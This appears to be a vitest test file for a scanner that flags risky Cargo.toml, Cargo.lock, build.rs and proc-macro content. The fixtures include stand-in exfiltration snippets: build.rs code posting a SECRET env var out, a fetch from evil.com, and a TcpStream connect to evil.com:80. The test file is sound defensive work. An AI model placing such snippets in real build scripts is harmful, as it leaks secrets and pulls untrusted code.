import { describe, it, expect } from "vitest";
import {
  scanCargoContent,
  scanCargoLockContent,
  isCargoFile,
  CARGO_PATTERNS,
} from "../cargo-scanner.js";
import { matchPatternInContent } from "../patterns.js";

function normalizePatternMatches(
  content: string,
  matches: ReturnType<typeof matchPatternInContent>,
) {
  const lineStarts = [0];
  for (let index = 0; index < content.length; index++) {
    if (content[index] === "\n") lineStarts.push(index + 1);
  }

  return matches.map((hit) => {
    const matchIndex = hit.match.index ?? 0;
    const absoluteStart = hit.match.input === content
      ? matchIndex
      : (lineStarts[hit.line - 1] ?? 0) + matchIndex;
    return { line: hit.line, start: absoluteStart, evidence: hit.text };
  });
}

describe("Cargo/Rust Scanner", () => {
  it("should identify Cargo-related files", () => {
    expect(isCargoFile("Cargo.toml")).toBe(true);
    expect(isCargoFile("Cargo.lock")).toBe(true);
    expect(isCargoFile("build.rs")).toBe(true);
    expect(isCargoFile("package.json")).toBe(false);
    expect(isCargoFile("main.rs")).toBe(false);
  });

  describe("build.rs scanning", () => {
    it("should detect Command::new in build.rs", () => {
      const content = 'fn main() {\n    Command::new("gcc").arg("lib.c").status();\n}';
      const findings = scanCargoContent(content, "build.rs", "build");
      expect(findings.some((f) => f.rule === "CARGO_BUILD_RS_EXEC")).toBe(true);
    });

    it("should detect network access in build.rs", () => {
      const content = 'fn main() {\n    let resp = reqwest::blocking::get("https://evil.com/lib.a");\n}';
      const findings = scanCargoContent(content, "build.rs", "build");
      expect(findings.some((f) => f.rule === "CARGO_BUILD_RS_NETWORK")).toBe(true);
    });

    it("should detect env var exfiltration in build.rs", () => {
      const content = 'fn main() {\n    let key = env::var("SECRET").unwrap(); let _ = reqwest::blocking::Client::new().post(url).body(key).send();\n}';
      const findings = scanCargoContent(content, "build.rs", "build");
      expect(findings.some((f) => f.rule === "CARGO_BUILD_RS_ENV_EXFIL")).toBe(true);
    });

    it("should detect a download written to disk in build.rs", () => {
      const content = 'fn main() { let data = curl(url); File::create("payload"); }';
      const findings = scanCargoContent(content, "build.rs", "build");
      expect(findings.some((f) => f.rule === "CARGO_BUILD_RS_DOWNLOAD")).toBe(true);
    });

    it("does not correlate isolated build.rs signals", () => {
      const content = [
        "let client = reqwest::blocking::Client::new();",
        'let secret = env::var("SECRET");',
        "let transport = curlx;",
      ].join("\n");
      const findings = scanCargoContent(content, "build.rs", "build");
      expect(findings.some((f) => f.rule === "CARGO_BUILD_RS_NETWORK")).toBe(false);
      expect(findings.some((f) => f.rule === "CARGO_BUILD_RS_ENV_EXFIL")).toBe(false);
      expect(findings.some((f) => f.rule === "CARGO_BUILD_RS_DOWNLOAD")).toBe(false);
    });

    it("does not bridge build.rs correlations across dot line terminators", () => {
      const content = [
        "reqwest\rget",
        "env::var\rTcpStream",
        "download\rFile::create",
      ].join("\n");
      const findings = scanCargoContent(content, "build.rs", "build");
      expect(findings.some((f) => f.rule === "CARGO_BUILD_RS_NETWORK")).toBe(false);
      expect(findings.some((f) => f.rule === "CARGO_BUILD_RS_ENV_EXFIL")).toBe(false);
      expect(findings.some((f) => f.rule === "CARGO_BUILD_RS_DOWNLOAD")).toBe(false);
    });

    it("should not flag clean build.rs", () => {
      const content = [
        "fn main() {",
        '    println!("cargo:rerun-if-changed=build.rs");',
        '    println!("cargo:rustc-link-lib=static=mylib");',
        "}",
      ].join("\n");
      const findings = scanCargoContent(content, "build.rs", "build");
      expect(findings).toHaveLength(0);
    });
  });

  describe("Cargo.toml scanning", () => {
    it("should detect git dependencies", () => {
      const content = '[dependencies]\nfoo = { git = "https://sketchy-host.com/foo.git" }';
      const findings = scanCargoContent(content, "Cargo.toml", "toml");
      expect(findings.some((f) => f.rule === "CARGO_GIT_DEPENDENCY")).toBe(true);
    });

    it("should not flag well-known git repos", () => {
      const content = '[dependencies]\ntokio = { git = "https://github.com/tokio-rs/tokio" }';
      const findings = scanCargoContent(content, "Cargo.toml", "toml");
      expect(findings.some((f) => f.rule === "CARGO_GIT_DEPENDENCY")).toBe(false);
    });

    it("should detect [patch] section", () => {
      const content = '[patch.crates-io]\nfoo = { path = "../my-fork" }';
      const findings = scanCargoContent(content, "Cargo.toml", "toml");
      expect(findings.some((f) => f.rule === "CARGO_PATCH_SECTION")).toBe(true);
    });

    it("should detect [replace] section", () => {
      const content = "[replace]\n'foo:0.1.0' = { path = '../my-fork' }";
      const findings = scanCargoContent(content, "Cargo.toml", "toml");
      expect(findings.some((f) => f.rule === "CARGO_REPLACE_SECTION")).toBe(true);
    });

    it("should not flag clean Cargo.toml", () => {
      const content = [
        "[package]",
        'name = "my-app"',
        'version = "0.1.0"',
        "",
        "[dependencies]",
        'serde = "1.0"',
        'tokio = { version = "1", features = ["full"] }',
      ].join("\n");
      const findings = scanCargoContent(content, "Cargo.toml", "toml");
      expect(findings).toHaveLength(0);
    });
  });

  describe("proc-macro scanning", () => {
    it("should detect file system access in proc macros", () => {
      const content = 'use std::fs;\nfn helper() { fs::read("secret.txt"); }';
      const findings = scanCargoContent(content, "src/lib.rs", "proc-macro");
      expect(findings.some((f) => f.rule === "CARGO_PROC_MACRO_FS")).toBe(true);
    });

    it("should detect network access in proc macros", () => {
      const content = 'use std::net::TcpStream;\nfn connect() { TcpStream::connect("evil.com:80"); }';
      const findings = scanCargoContent(content, "src/lib.rs", "proc-macro");
      expect(findings.some((f) => f.rule === "CARGO_PROC_MACRO_NETWORK")).toBe(true);
    });
  });

  describe("Cargo.lock scanning", () => {
    // Real bundled IOC (TrapDoor crates.io campaign, cargo: bare-name entry)
    const MALICIOUS_CRATE = "move-analyzer-build";

    it("should flag a locked crate matching a cargo: IOC", () => {
      const content = [
        "# This file is automatically @generated by Cargo.",
        "version = 3",
        "",
        "[[package]]",
        `name = "${MALICIOUS_CRATE}"`,
        'version = "0.1.0"',
        'source = "registry+https://github.com/rust-lang/crates.io-index"',
        "",
        "[[package]]",
        'name = "serde"',
        'version = "1.0.203"',
      ].join("\n");
      const findings = scanCargoLockContent(content, "Cargo.lock");
      const hit = findings.find((f) => f.rule === "CARGO_MALICIOUS_CRATE");
      expect(hit).toBeDefined();
      expect(hit?.severity).toBe("critical");
      expect(hit?.category).toBe("malware");
      expect(hit?.description).toContain(`${MALICIOUS_CRATE}@0.1.0`);
    });

    it("should not flag a clean Cargo.lock (FP-safety)", () => {
      const content = [
        "version = 3",
        "",
        "[[package]]",
        'name = "serde"',
        'version = "1.0.203"',
        "",
        "[[package]]",
        'name = "tokio"',
        'version = "1.38.0"',
        "dependencies = [",
        ' "bytes",',
        ' "libc",',
        "]",
        "",
        "[metadata]",
      ].join("\n");
      expect(scanCargoLockContent(content, "Cargo.lock")).toHaveLength(0);
    });

    it("should not crash on malformed Cargo.lock", () => {
      expect(() => scanCargoLockContent("[[package]\nname = ", "Cargo.lock")).not.toThrow();
      expect(scanCargoLockContent("", "Cargo.lock")).toHaveLength(0);
    });
  });

  it("should include line numbers in findings", () => {
    const content = "[dependencies]\n# comment\n[patch.crates-io]\nfoo = { path = '.' }";
    const findings = scanCargoContent(content, "Cargo.toml", "toml");
    expect(findings.find((f) => f.rule === "CARGO_PATCH_SECTION")?.line).toBe(3);
  });

  it("matches the legacy regex verdict on build.rs correlation edge cases", () => {
    const cases: Array<[string, string[]]> = [
      ["CARGO_BUILD_RS_NETWORK", [
        "reqwest::blocking::get(url)",
        "TcpStream::connect(addr)",
        "reqwest\rget",
        "reqwest\u2028get",
        "reqwest\u2029get",
        "REQWEST request then post then FETCH",
        "reqwest hyper get x post",
        "TcpStream::connect x reqwest get post",
        "reqwest get x TcpStream::connect x post",
        "before\nreqwest get x post",
      ]],
      ["CARGO_BUILD_RS_ENV_EXFIL", [
        "env::var(name); reqwest x hyper",
        "env::var_os then reqwest",
        "reqwest then env::var_os",
        "UdpSocket; env::var(name) x env::var_os",
        "env::var\rTcpStream",
        "env::var\u2028TcpStream",
        "env::var\u2029TcpStream",
        "TcpStream\renv::var_os",
        "TcpStream\u2028env::var_os",
        "TcpStream\u2029env::var_os",
        "before\nreqwest env::var_os",
      ]],
      ["CARGO_BUILD_RS_DOWNLOAD", [
        "curl(url); File::create(path) then save",
        "curl wget copy x write_all",
        "save(); download(url)",
        "download\rwrite_all",
        "download\u2028write_all",
        "download\u2029write_all",
        "before\ncurl copy x save",
      ]],
    ];

    for (const [rule, sources] of cases) {
      const structural = CARGO_PATTERNS.find((entry) => entry.rule === rule)!;
      const regex = { ...structural, correlatedMatcher: undefined };
      for (const content of sources) {
        const expected = normalizePatternMatches(
          content,
          matchPatternInContent(regex, content, "i"),
        );
        const actual = normalizePatternMatches(
          content,
          matchPatternInContent(structural, content, "i"),
        );
        expect(actual, `${rule}: ${JSON.stringify(content)}`).toEqual(expected);
      }
    }
  });

  it("fully scans 5 MiB build.rs near misses in linear time", { timeout: 15_000 }, () => {
    const size = 5 * 1024 * 1024;
    const cases: Array<[string, string]> = [
      ["CARGO_BUILD_RS_NETWORK", "reqwest "],
      ["CARGO_BUILD_RS_ENV_EXFIL", "env::var "],
      ["CARGO_BUILD_RS_DOWNLOAD", "curlx"],
    ];
    const started = Date.now();

    for (const [rule, unit] of cases) {
      const pattern = CARGO_PATTERNS.find((entry) => entry.rule === rule)!;
      const content = unit.repeat(Math.ceil(size / unit.length)).slice(0, size);
      const hits = matchPatternInContent(pattern, content, "i");
      expect(hits, rule).toHaveLength(0);
      expect(hits.coverage.complete, rule).toBe(true);
      expect(hits.coverage.regexAttempts, rule).toBe(1);
    }

    expect(Date.now() - started).toBeLessThan(5_000);
  });

  it("should have patterns array", () => {
    expect(CARGO_PATTERNS.length).toBeGreaterThan(5);
    for (const p of CARGO_PATTERNS) {
      expect(p.rule).toBeTruthy();
      expect(p.severity).toBeTruthy();
    }
  });
});
